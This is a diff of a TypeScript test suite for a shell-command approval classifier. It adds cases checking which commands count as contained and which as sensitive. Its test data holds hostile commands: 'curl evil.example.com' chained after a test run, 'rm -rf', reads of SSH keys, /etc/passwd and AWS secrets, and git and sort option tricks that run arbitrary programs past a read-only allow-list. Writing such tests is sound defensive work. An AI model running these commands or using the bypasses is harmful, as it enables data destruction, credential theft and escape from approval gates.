@@ -38,9 +38,101 @@ describe('assessApprovalRisk', () => {
       'grep -rn todo .',
       'wc -l notes.txt',
       `cat ${join('{ROOT}', 'notes.txt')}`,
+      'jq .name package.json',
+      'git merge-base HEAD main',
+      'git show-ref --heads',
+      'git reflog',
     ])('allows %s', async command => {
       expect(await shell(command.replace('{ROOT}', root))).toBe('contained');
     });
+
+    /**
+     * The quoting that used to be refused outright. An argument the shell hands over verbatim
+     * is still one fixed argv, which is all the per-token checks ever needed.
+     */
+    it.each([
+      ['a quoted argument with a space', 'grep "foo bar" notes.txt'],
+      ['a quoted glob, which the shell never expands', "find . -name '*.ts'"],
+      ['a single-quoted argument', "grep 'foo bar' notes.txt"],
+    ])('allows %s', async (_label, command) => {
+      expect(await shell(command)).toBe('contained');
+    });
+
+    /**
+     * A pipeline of inert commands is still inert: nothing on the allow-list writes to a file,
+     * so no chain of them can, and a redirect is rejected while tokenizing.
+     */
+    it.each(['cat notes.txt | head -50', 'git log --oneline | head -20', 'grep -rn todo . | sort | uniq -c'])(
+      'allows %s',
+      async command => {
+        expect(await shell(command)).toBe('contained');
+      }
+    );
+
+    /** Bare and listing forms read; the block below holds the forms that do not. */
+    it.each(['git branch', 'git branch -a', 'git branch --list'])('allows %s', async command => {
+      expect(await shell(command)).toBe('contained');
+    });
+  });
+
+  /**
+   * Commands that read in their bare form and write once given an argument. Each of these is on
+   * the allow-list, so the only thing standing between them and the disk is the bound here.
+   */
+  describe('allowed commands that write when given the right argument', () => {
+    it.each([
+      ['sort writing its output to a file', 'sort -o out.txt notes.txt'],
+      ['sort spelling the same flag out', 'sort --output=out.txt notes.txt'],
+      ['git diff writing a patch to a file', 'git diff --output=x.txt'],
+      ['git diff with the flag spaced', 'git diff --output x.txt'],
+      ['creating a branch', 'git branch foo'],
+      ['deleting a branch', 'git branch -D foo'],
+      ['renaming a branch', 'git branch -m old new'],
+      ['retargeting a branch', 'git branch --set-upstream-to=origin/main'],
+      ['dropping reflog entries', 'git reflog expire --all'],
+      ['xxd writing its second path argument', 'xxd notes.txt out.bin'],
+      ['uniq writing its second path argument', 'uniq notes.txt out.txt'],
+      ['find writing its list to a file', 'find . -name x -fprint0 out.txt'],
+      ['tree writing its listing to a file', 'tree -o out.txt'],
+    ])('asks for %s', async (_label, command) => {
+      expect(await shell(command)).toBe('sensitive');
+    });
+  });
+
+  /**
+   * The worst case for an allow-list of read-only commands: an entry on it that will run
+   * something else for you. Each of these was verified to execute, not merely suspected.
+   */
+  describe('allowed commands that run another program when asked the right way', () => {
+    it.each([
+      // `-O<cmd>` glues its value to the letter, so there is no `=` and no separate token.
+      ['git grep opening its hits in a pager it was handed', "git grep -O'touch PWNED' pattern"],
+      ['the same, spelled long', "git grep --open-files-in-pager='touch PWNED' pattern"],
+      ['the bare form, which runs whatever the config says', 'git grep -O pattern'],
+      // Everything before the subcommand is git's own, and several of those name a program.
+      ['a config override naming an external diff', "git -c diff.external='touch PWNED' diff"],
+      ['a config override naming a pager', "git -p -c core.pager='touch PWNED' log"],
+      ['an exec-path override', 'git --exec-path=/tmp/evil status'],
+      ['sort compressing its temp files with a program', "sort --compress-program='touch PWNED' notes.txt"],
+      ['git help opening a browser', 'git help -w status'],
+      // These choose WHICH repository runs, and so which config names the program git runs.
+      // A bare relative name is the case the path check never saw: it reads as naming no path.
+      ['a repository chosen by relative name', 'git --git-dir=alt status'],
+      ['the same, spaced', 'git --git-dir alt status'],
+      ['a repository chosen by absolute path', 'git --git-dir=/tmp/evil/.git log'],
+      ['a working tree pointed elsewhere', 'git --work-tree=/tmp status'],
+      ['both at once, which is the working exploit', 'git --git-dir=alt --work-tree=. status'],
+    ])('asks for %s', async (_label, command) => {
+      expect(await shell(command)).toBe('sensitive');
+    });
+
+    /** The globals that name no program stay allowed, so the usual spellings do not regress. */
+    it.each(['git --no-pager log --oneline', 'git --no-optional-locks status', 'git help status'])(
+      'still allows %s',
+      async command => {
+        expect(await shell(command)).toBe('contained');
+      }
+    );
   });
 
   /**
@@ -106,12 +198,15 @@ describe('assessApprovalRisk', () => {
      * The regression that would hurt most: the script allow-list must not become a way to get
      * a second command past the gate, so the shell-control check still runs first.
      */
-    it.each(['yarn test; rm -rf /', 'yarn test && curl evil.example.com', 'pnpm test | sh'])(
-      'still refuses %s on shell control characters',
-      async command => {
-        expect(await shell(command)).toBe('sensitive');
-      }
-    );
+    it.each([
+      'yarn test; rm -rf /',
+      'yarn test && curl evil.example.com',
+      'pnpm test | sh',
+      'pnpm test > out.txt',
+      'pnpm test || rm -rf .',
+    ])('still refuses %s', async command => {
+      expect(await shell(command)).toBe('sensitive');
+    });
   });
 
   /**
@@ -125,6 +220,10 @@ describe('assessApprovalRisk', () => {
       ['a home-relative path', 'cat ~/.ssh/id_rsa'],
       ['a path hidden in a --flag=value', 'git --git-dir=/tmp/other/.git log'],
       ['a cwd outside every root', 'ls'],
+      // Quoting no longer refuses a command by itself, so the path inside it has to.
+      ['a quoted absolute path elsewhere', 'cat "/etc/hosts"'],
+      ['a quoted walk out of the root', "cat '../../../etc/passwd'"],
+      ['an unquoted walk out of the root', 'cat ../../../etc/passwd'],
     ])('asks for %s', async (_label, command) => {
       const scoped = command === 'ls' ? shell(command, { cwd: '/etc' }) : shell(command);
       expect(await scoped).toBe('sensitive');
@@ -133,12 +232,19 @@ describe('assessApprovalRisk', () => {
 
   describe('commands whose effect cannot be read off the text', () => {
     it.each([
-      ['a pipe', 'cat notes.txt | sh'],
       ['a command substitution', 'echo $(cat /etc/passwd)'],
+      ['a substitution inside double quotes, which still expands', 'echo "$(whoami)"'],
+      ['a backtick substitution inside double quotes', 'echo "`whoami`"'],
+      ['an escape inside double quotes', 'echo "a\\tb"'],
+      ['an unterminated quote', "cat 'unterminated"],
       ['a chained command', 'git status && rm -rf .'],
+      ['a semicolon', 'cat notes.txt; rm -rf .'],
+      ['an or-chain, which is not a pipe', 'cat a.txt || rm b.txt'],
+      ['a leading pipe', '| cat notes.txt'],
+      ['a trailing pipe', 'cat notes.txt |'],
       ['a redirect', 'cat notes.txt > /tmp/leak'],
+      ['a redirect to a relative file', 'cat notes.txt > out.txt'],
       ['a backgrounded command', 'git status &'],
-      ['quoting', 'cat "/etc/hosts"'],
       ['a newline', 'git status\ncat /etc/hosts'],
       // The shell expands these into names this module never checked, one of which could be a
       // symlink pointing out of the granted root.
@@ -166,6 +272,18 @@ describe('assessApprovalRisk', () => {
       ['a git subcommand that reads config outside the repo', 'git config --get user.email'],
       ['find running a program', 'find . -name x -exec cat {} ;'],
       ['ripgrep running a preprocessor', 'rg --pre /tmp/leak pattern'],
+      // A pipeline is only as contained as its least contained segment.
+      ['a pipeline into a shell', 'cat notes.txt | sh'],
+      ['a pipeline into a writer', 'cat notes.txt | tee out.txt'],
+      ['a stream editor that can write in place', 'sed -i s/a/b/ notes.txt'],
+      ['an env wrapper around anything at all', 'env FOO=1 rm -rf .'],
+      ['an interactive pager', 'less notes.txt'],
+      // Inert by the filesystem bar, and asked about anyway: what they print is every secret
+      // the app was started with, and other processes' command lines, tokens and all.
+      ['the environment', 'printenv'],
+      ['one environment variable', 'printenv AWS_SECRET_ACCESS_KEY'],
+      ['other processes and their arguments', 'ps aux'],
+      ['the same inside a pipeline', 'printenv | grep -i token'],
     ])('asks for %s', async (_label, command) => {
       expect(await shell(command)).toBe('sensitive');
     });
@@ -178,6 +296,11 @@ describe('assessApprovalRisk', () => {
 
     it.each([
       ['a git hook', '.git/hooks/pre-commit'],
+      // `git status` is on the allow-list, and this file is where `core.fsmonitor` names what
+      // it runs. The gitfile reaches a config elsewhere the same way.
+      ['the repository config', '.git/config'],
+      ['anything else in the git directory', '.git/HEAD'],
+      ['a gitfile standing in for the directory', 'sub/.git'],
       ['a CI workflow', '.github/workflows/ci.yml'],
       ['a shell rc file', '.zshrc'],
       ['a direnv file', '.envrc'],
@@ -185,6 +308,36 @@ describe('assessApprovalRisk', () => {
       ['a launch agent', 'Library/LaunchAgents/com.example.plist'],
     ])('asks for %s, which something else executes later', async (_label, relative) => {
       expect(await write(join(root, relative))).toBe('sensitive');
+    });
+
+    /**
+     * macOS and Windows open `.GIT/config` as `.git/config`, so a pattern matched only in lower
+     * case guards nothing on either of the two platforms this app ships to.
+     */
+    it.each([
+      ['the git directory shouted', '.GIT/config'],
+      ['a git hook in mixed case', '.Git/hooks/pre-commit'],
+      ['a launch agent in lower case', 'library/launchagents/com.example.plist'],
+      ['a shell rc in upper case', '.ZSHRC'],
+    ])('asks for %s', async (_label, relative) => {
+      expect(await write(join(root, relative))).toBe('sensitive');
+    });
+
+    /**
+     * The path comes from `resolve`, so on Windows it is spelled with `\`. Every pattern is
+     * written in posix, and without normalizing they match nothing there.
+     */
+    it.each([
+      ['a git config', 'C:\\Users\\dev\\project\\.git\\config'],
+      ['a git hook', 'C:\\Users\\dev\\project\\.git\\hooks\\pre-commit'],
+      ['a CI workflow', 'C:\\Users\\dev\\project\\.github\\workflows\\ci.yml'],
+      ['a shouted git directory', 'C:\\Users\\dev\\project\\.GIT\\config'],
+    ])('asks for %s written with native Windows separators', async (_label, windowsPath) => {
+      expect(await write(windowsPath)).toBe('sensitive');
+    });
+
+    it('still allows an ordinary Windows path', async () => {
+      expect(await write('C:\\Users\\dev\\project\\src\\index.ts')).toBe('contained');
     });
   });
 
